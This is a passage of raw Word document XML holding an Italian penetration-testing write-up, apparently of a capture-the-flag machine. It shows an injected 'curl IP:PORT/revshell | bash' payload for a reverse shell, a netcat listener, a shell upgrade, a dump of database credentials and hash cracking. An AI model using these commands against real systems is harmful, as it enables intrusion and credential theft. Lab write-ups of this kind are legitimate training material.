        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:bidi w:val="0"/>
        <w:spacing w:before="240" w:beforeAutospacing="off" w:after="240" w:afterAutospacing="off"/>
        <w:rPr>
          <w:rFonts w:ascii="Constantia" w:hAnsi="Constantia" w:eastAsia="Constantia" w:cs="Constantia"/>
          <w:noProof w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pP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attr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("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popen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")(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"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curl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 xml:space="preserve"> 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IP:PORT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/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revshell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 xml:space="preserve"> | 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bash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")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 xml:space="preserve">: Usa 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>popen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 xml:space="preserve"> del modulo os per eseguire il comando shell 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>curl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 xml:space="preserve"> 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>IP:PORT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>/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>revshell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 xml:space="preserve"> | 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>bash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>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="1CBEC19C" w:rsidP="21040C4D" w:rsidRDefault="1CBEC19C" w14:paraId="5AD74623" w14:textId="08D23023">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:bidi w:val="0"/>
        <w:spacing w:before="240" w:beforeAutospacing="off" w:after="240" w:afterAutospacing="off"/>
        <w:rPr>
          <w:rFonts w:ascii="Constantia" w:hAnsi="Constantia" w:eastAsia="Constantia" w:cs="Constantia"/>
          <w:noProof w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pP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attr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("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read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")(</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="1CBEC19C">
        <w:rPr>
          <w:rFonts w:ascii="Constantia" w:hAnsi="Constantia" w:eastAsia="Constantia" w:cs="Constantia"/>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:noProof w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="1CBEC19C">
        <w:rPr>
          <w:rFonts w:ascii="Constantia" w:hAnsi="Constantia" w:eastAsia="Constantia" w:cs="Constantia"/>
          <w:noProof w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>: Legge il risultato dell'esecuzione del comando shell.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="43BAE7FB" w14:textId="0FB3A5F4">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="55647F92" w:rsidP="21040C4D" w:rsidRDefault="55647F92" w14:paraId="17EA5D8E" w14:textId="7FCE243C">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
        <w:rPr>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="21040C4D" w:rsidR="55647F92">
        <w:rPr>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
        </w:rPr>
        <w:t>La parte in cui c’è scritto “</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="55647F92">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>("</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="55647F92">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>curl</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="55647F92">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="55647F92">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>IP:PORT</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="55647F92">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="55647F92">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>revshell</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="55647F92">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="55647F92">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>bash</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="55647F92">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>")</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="55647F92">
        <w:rPr>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">” </w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="719D5A11">
        <w:rPr>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">dovrà essere sostituita con un apposito comando che ci permetterà di ottenere la </w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="719D5A11">
        <w:rPr>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
        </w:rPr>
        <w:t>ReverseShell</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="719D5A11">
        <w:rPr>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="5F81DAF1" w:rsidP="21040C4D" w:rsidRDefault="5F81DAF1" w14:paraId="1B4C8DD0" w14:textId="3F5ADE53">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
        <w:rPr>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="21040C4D" w:rsidR="5F81DAF1">
        <w:rPr>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Sul sito web </w:t>
      </w:r>
      <w:hyperlink r:id="Ra1558f1af18c4c35">
        <w:r w:rsidRPr="21040C4D" w:rsidR="5F81DAF1">
          <w:rPr>
            <w:rStyle w:val="Collegamentoipertestuale"/>
            <w:i w:val="0"/>
            <w:iCs w:val="0"/>
          </w:rPr>
          <w:t>https://www.revshells.com/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="21040C4D" w:rsidR="5F81DAF1">
        <w:rPr>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> nella sezione “</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="5F81DAF1">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
        </w:rPr>
        <w:t>nc</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="5F81DAF1">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="5F81DAF1">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
        </w:rPr>
        <w:t>mkfifo</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="5F81DAF1">
        <w:rPr>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
        </w:rPr>
        <w:t>” c’è proprio quello che fa per noi.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="5F81DAF1" w:rsidP="21040C4D" w:rsidRDefault="5F81DAF1" w14:paraId="619D686A" w14:textId="3D18DDD8">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="5F81DAF1">
        <w:drawing>
          <wp:inline wp14:editId="06923516" wp14:anchorId="2B9D6F3E">
            <wp:extent cx="5267324" cy="2886075"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="411734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e1cb79ee2c40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5AEE40" w:rsidP="21040C4D" w:rsidRDefault="155AEE40" w14:paraId="20D59054" w14:textId="0B416734">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="155AEE40">
        <w:rPr/>
        <w:t>Ora dobbiamo inserire tale comando all’interno del payload e codificarlo.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="155AEE40" w:rsidP="21040C4D" w:rsidRDefault="155AEE40" w14:paraId="0DA1A5CE" w14:textId="549A14D0">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="155AEE40">
        <w:rPr/>
        <w:t>Una volta codificato il payload avremo il seguente risultato:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="5A1A8B37" w:rsidP="21040C4D" w:rsidRDefault="5A1A8B37" w14:paraId="6D381106" w14:textId="086E7651">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="5A1A8B37">
        <w:drawing>
          <wp:inline wp14:editId="341078ED" wp14:anchorId="0464EAB6">
            <wp:extent cx="5267324" cy="3895725"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="14989553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3ff6b664f04e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1A8B37" w:rsidP="21040C4D" w:rsidRDefault="5A1A8B37" w14:paraId="07A92E25" w14:textId="663F7A19">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="5A1A8B37">
        <w:rPr/>
        <w:t>Prima però di inviare il payload assicuriamoci di metterci in ascolto sulla porta specificata nella reverse shell (In questo caso la 8082).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="358B7BE4" w:rsidP="21040C4D" w:rsidRDefault="358B7BE4" w14:paraId="73FBC053" w14:textId="1D4F8B23">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="358B7BE4">
        <w:drawing>
          <wp:inline wp14:editId="75DDC26C" wp14:anchorId="682F0D67">
            <wp:extent cx="4180953" cy="914286"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="174566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d5dc2c50c540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953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8B7BE4" w:rsidP="21040C4D" w:rsidRDefault="358B7BE4" w14:paraId="11534E9B" w14:textId="7E6D3922">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="358B7BE4">
        <w:rPr/>
        <w:t xml:space="preserve">Ora effettuiamo il forward del payload e se va bene otteniamo la </w:t>
      </w:r>
      <w:r w:rsidR="358B7BE4">
        <w:rPr/>
        <w:t>ReverseShell</w:t>
      </w:r>
      <w:r w:rsidR="358B7BE4">
        <w:rPr/>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="358B7BE4" w:rsidP="21040C4D" w:rsidRDefault="358B7BE4" w14:paraId="0669D940" w14:textId="12C2AB6E">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="358B7BE4">
        <w:drawing>
          <wp:inline wp14:editId="1ACC4442" wp14:anchorId="4B1D2C7A">
            <wp:extent cx="4695238" cy="1723810"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1686795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fc6da3913741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8B7BE4" w:rsidP="21040C4D" w:rsidRDefault="358B7BE4" w14:paraId="03C937A4" w14:textId="4E41FD94">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="358B7BE4">
        <w:rPr/>
        <w:t xml:space="preserve">Ora siamo entrati come utente “www-data”. </w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r w:rsidR="2FA5F223">
        <w:rPr/>
        <w:t xml:space="preserve">Per renderci la vita più agiata possiamo utilizzare il seguente comando per passare da sh a </w:t>
      </w:r>
      <w:r w:rsidR="2FA5F223">
        <w:rPr/>
        <w:t>bash</w:t>
      </w:r>
      <w:r w:rsidR="2FA5F223">
        <w:rPr/>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="2056563A" w14:textId="04505938">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="27A83205">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve">python3 -c 'import </w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="27A83205">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>pty</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="27A83205">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve">; </w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="27A83205">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>pty.spawn</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="27A83205">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>("/bin/</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="27A83205">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>bash</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="27A83205">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>")'</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="620FBF00" w:rsidP="21040C4D" w:rsidRDefault="620FBF00" w14:paraId="59A2E6BA" w14:textId="37672B56">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="620FBF00">
        <w:drawing>
          <wp:inline wp14:editId="439324E6" wp14:anchorId="718BE867">
            <wp:extent cx="2190476" cy="609524"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="13143571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87b9ec4fb846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991BBD" w:rsidP="21040C4D" w:rsidRDefault="21991BBD" w14:paraId="636AFCA9" w14:textId="33C5DBFC">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="21991BBD">
        <w:rPr/>
        <w:t xml:space="preserve">Effettuando una semplice </w:t>
      </w:r>
      <w:r w:rsidR="21991BBD">
        <w:rPr/>
        <w:t>ls</w:t>
      </w:r>
      <w:r w:rsidR="21991BBD">
        <w:rPr/>
        <w:t xml:space="preserve"> andiamo a scoprire che all’interno della cartella </w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="21991BBD">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="21991BBD">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>opt</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="21991BBD">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>/app</w:t>
      </w:r>
      <w:r w:rsidR="21991BBD">
        <w:rPr/>
        <w:t xml:space="preserve"> è presente l’applicazione in Python che è in esecuzione sulla porta 80.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="6F56BC47" w:rsidP="21040C4D" w:rsidRDefault="6F56BC47" w14:paraId="44FD75DA" w14:textId="6B0D50F6">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="6F56BC47">
        <w:drawing>
          <wp:inline wp14:editId="0F337A7E" wp14:anchorId="070C932C">
            <wp:extent cx="5267324" cy="5029200"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="17982247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1860437d5848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56BC47" w:rsidP="21040C4D" w:rsidRDefault="6F56BC47" w14:paraId="12B36EC6" w14:textId="70A3430E">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="6F56BC47">
        <w:rPr/>
        <w:t>Analizzare il seguente codice sorgente ci dà moliti indizi tra cui:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="6F56BC47" w:rsidP="21040C4D" w:rsidRDefault="6F56BC47" w14:paraId="670E54F1" w14:textId="7D9348BF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
        <w:rPr/>
      </w:pPr>
      <w:r w:rsidR="6F56BC47">
        <w:rPr/>
        <w:t xml:space="preserve">La Web App è scritta in </w:t>
      </w:r>
      <w:r w:rsidR="6F56BC47">
        <w:rPr/>
        <w:t>Flask</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="6F56BC47" w:rsidP="21040C4D" w:rsidRDefault="6F56BC47" w14:paraId="5672AD9E" w14:textId="47D4844C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
        <w:rPr/>
      </w:pPr>
      <w:r w:rsidR="6F56BC47">
        <w:rPr/>
        <w:t>Abbiamo i criteri di sanificazione dei campi di input attraverso la funzione “</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="6F56BC47">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>sanitize</w:t>
      </w:r>
      <w:r w:rsidR="6F56BC47">
        <w:rPr/>
        <w:t>”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="6F56BC47" w:rsidP="21040C4D" w:rsidRDefault="6F56BC47" w14:paraId="7E8EA781" w14:textId="6A32B91F">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
        <w:rPr/>
      </w:pPr>
      <w:r w:rsidR="6F56BC47">
        <w:rPr/>
        <w:t>Le credenziali del database sono esposte ed in chiaro.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="6F56BC47" w:rsidP="21040C4D" w:rsidRDefault="6F56BC47" w14:paraId="23D98C5C" w14:textId="6EF9C479">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="6F56BC47">
        <w:rPr/>
        <w:t>Una volta ottenute queste informazioni cruciali per il pentesting</w:t>
      </w:r>
      <w:r w:rsidR="416AD9B0">
        <w:rPr/>
        <w:t xml:space="preserve">, possiamo procedere accedendo al Database </w:t>
      </w:r>
      <w:r w:rsidR="416AD9B0">
        <w:rPr/>
        <w:t>Mysql</w:t>
      </w:r>
      <w:r w:rsidR="416AD9B0">
        <w:rPr/>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="416AD9B0" w:rsidP="21040C4D" w:rsidRDefault="416AD9B0" w14:paraId="1D8FEE08" w14:textId="1818C896">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="416AD9B0">
        <w:drawing>
          <wp:inline wp14:editId="6E4FFC74" wp14:anchorId="7D0E0F0B">
            <wp:extent cx="5267324" cy="3790950"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="11628326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c0f4d2845b47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6AD9B0" w:rsidP="21040C4D" w:rsidRDefault="416AD9B0" w14:paraId="266DD2AA" w14:textId="036B0E2B">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="416AD9B0">
        <w:rPr/>
        <w:t xml:space="preserve">In questa schermata vediamo che abbiamo a disposizione </w:t>
      </w:r>
      <w:r w:rsidR="416AD9B0">
        <w:rPr/>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidR="416AD9B0">
        <w:rPr/>
        <w:t xml:space="preserve"> database di cui uno di nostro interesse ovvero “</w:t>
      </w:r>
      <w:r w:rsidR="416AD9B0">
        <w:rPr/>
        <w:t>capiclean</w:t>
      </w:r>
      <w:r w:rsidR="416AD9B0">
        <w:rPr/>
        <w:t>”.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="484FB3C6" w:rsidP="21040C4D" w:rsidRDefault="484FB3C6" w14:paraId="17C4FBAF" w14:textId="5CAC9228">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="484FB3C6">
        <w:drawing>
          <wp:inline wp14:editId="57658BA9" wp14:anchorId="332720C7">
            <wp:extent cx="5267324" cy="2886075"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="7000435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e01502563248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4FB3C6" w:rsidP="21040C4D" w:rsidRDefault="484FB3C6" w14:paraId="793C90A8" w14:textId="0A0278E0">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="484FB3C6">
        <w:rPr/>
        <w:t>Da questa schermata individuiamo la tabella degli utenti che contiene la lista degli utenti.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="69BCCF3B" w:rsidP="21040C4D" w:rsidRDefault="69BCCF3B" w14:paraId="337355EC" w14:textId="6064E935">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="69BCCF3B">
        <w:rPr/>
        <w:t>In particolare,</w:t>
      </w:r>
      <w:r w:rsidR="69BCCF3B">
        <w:rPr/>
        <w:t xml:space="preserve"> ci sono </w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="69BCCF3B">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve">admin </w:t>
      </w:r>
      <w:r w:rsidR="69BCCF3B">
        <w:rPr/>
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="69BCCF3B">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
        <w:t>consuela</w:t>
      </w:r>
      <w:r w:rsidR="69BCCF3B">
        <w:rPr/>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="7E622A39" w:rsidP="21040C4D" w:rsidRDefault="7E622A39" w14:paraId="01960066" w14:textId="0343DA05">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="7E622A39">
        <w:drawing>
          <wp:inline wp14:editId="39C7E28A" wp14:anchorId="76C9F8BF">
            <wp:extent cx="5267324" cy="1009650"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1741268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a51e119cc741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BCCF3B" w:rsidP="21040C4D" w:rsidRDefault="69BCCF3B" w14:paraId="46A5E713" w14:textId="3822731E">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="69BCCF3B">
        <w:rPr/>
        <w:t>Ottenuto l’</w:t>
      </w:r>
      <w:r w:rsidR="69BCCF3B">
        <w:rPr/>
        <w:t>hash</w:t>
      </w:r>
      <w:r w:rsidR="69BCCF3B">
        <w:rPr/>
        <w:t xml:space="preserve"> delle loro password procediamo con il cracking per risalire alla password originale.</w:t>
      </w:r>
      <w:r w:rsidR="155449CE">
        <w:rPr/>
        <w:t xml:space="preserve"> Per crackare la password possiamo usare Jhon oppure siti terzi che ci permettono di velocizzare. In questo caso sarà utilizzato: </w:t>
      </w:r>
      <w:hyperlink r:id="R3bebe290d9994126">
        <w:r w:rsidRPr="21040C4D" w:rsidR="30A5F2E3">
          <w:rPr>
            <w:rStyle w:val="Collegamentoipertestuale"/>
          </w:rPr>
          <w:t>https://www.crackstation.net</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="209AF524" w:rsidP="21040C4D" w:rsidRDefault="209AF524" w14:paraId="05E44F80" w14:textId="787B85DE">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="209AF524">
        <w:drawing>
          <wp:inline wp14:editId="35955AF5" wp14:anchorId="23F083F4">
            <wp:extent cx="5267324" cy="2857500"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="4841195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5f3a6a80694f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9AF524" w:rsidP="21040C4D" w:rsidRDefault="209AF524" w14:paraId="0724BBD0" w14:textId="348E7F3D">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="209AF524">
        <w:rPr/>
        <w:t xml:space="preserve">Non è stato possibile recuperare la password dell’admin. In compenso possiamo sempre provare con </w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="209AF524">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
        <w:t>consuela</w:t>
      </w:r>
      <w:r w:rsidR="209AF524">
        <w:rPr/>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="209AF524" w:rsidP="21040C4D" w:rsidRDefault="209AF524" w14:paraId="09DE76B7" w14:textId="3077A903">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="209AF524">
        <w:drawing>
          <wp:inline wp14:editId="61EFEED4" wp14:anchorId="4A821406">
            <wp:extent cx="5267324" cy="2847975"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="596319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ccc46b38c441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F4BDE0" w:rsidP="21040C4D" w:rsidRDefault="66F4BDE0" w14:paraId="19039DD2" w14:textId="093C721A">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:bookmarkStart w:name="_Toc315770793" w:id="1392942476"/>
      <w:r w:rsidR="66F4BDE0">
        <w:rPr/>
        <w:t>CWE-1391</w:t>
      </w:r>
      <w:r w:rsidR="77C215B9">
        <w:rPr/>
        <w:t xml:space="preserve">: Use of </w:t>
      </w:r>
      <w:r w:rsidR="77C215B9">
        <w:rPr/>
        <w:t>Weak</w:t>
      </w:r>
      <w:r w:rsidR="77C215B9">
        <w:rPr/>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="77C215B9">
        <w:rPr/>
        <w:t>Credentials</w:t>
      </w:r>
      <w:r w:rsidR="77C215B9">
        <w:rPr/>
        <w:t xml:space="preserve"> (4.14) - MITRE</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1392942476"/>
    </w:p>
    <w:p w:rsidR="77C215B9" w:rsidP="21040C4D" w:rsidRDefault="77C215B9" w14:paraId="28C0E1C1" w14:textId="112EF75D">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:bookmarkStart w:name="_Toc1386223911" w:id="2137313021"/>
      <w:r w:rsidR="77C215B9">
        <w:rPr/>
        <w:t xml:space="preserve">CWE-522: </w:t>
      </w:r>
      <w:r w:rsidR="77C215B9">
        <w:rPr/>
        <w:t>Insufficiently</w:t>
      </w:r>
      <w:r w:rsidR="77C215B9">
        <w:rPr/>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="77C215B9">
        <w:rPr/>
        <w:t>Protected</w:t>
      </w:r>
      <w:r w:rsidR="77C215B9">
        <w:rPr/>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="77C215B9">
        <w:rPr/>
        <w:t>Credentials</w:t>
      </w:r>
      <w:bookmarkEnd w:id="2137313021"/>
    </w:p>
    <w:p w:rsidR="209AF524" w:rsidP="21040C4D" w:rsidRDefault="209AF524" w14:paraId="1792E0C6" w14:textId="3CAD7855">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="209AF524">
        <w:rPr/>
        <w:t xml:space="preserve">Questa volta il cracking è andato a buon fine </w:t>
      </w:r>
      <w:r w:rsidR="209AF524">
        <w:rPr/>
        <w:t>rivelando</w:t>
      </w:r>
      <w:r w:rsidR="209AF524">
        <w:rPr/>
        <w:t xml:space="preserve"> la </w:t>
      </w:r>
      <w:r w:rsidR="209AF524">
        <w:rPr/>
        <w:t>password</w:t>
      </w:r>
      <w:r w:rsidR="209AF524">
        <w:rPr/>
        <w:t xml:space="preserve"> che risulta essere:</w:t>
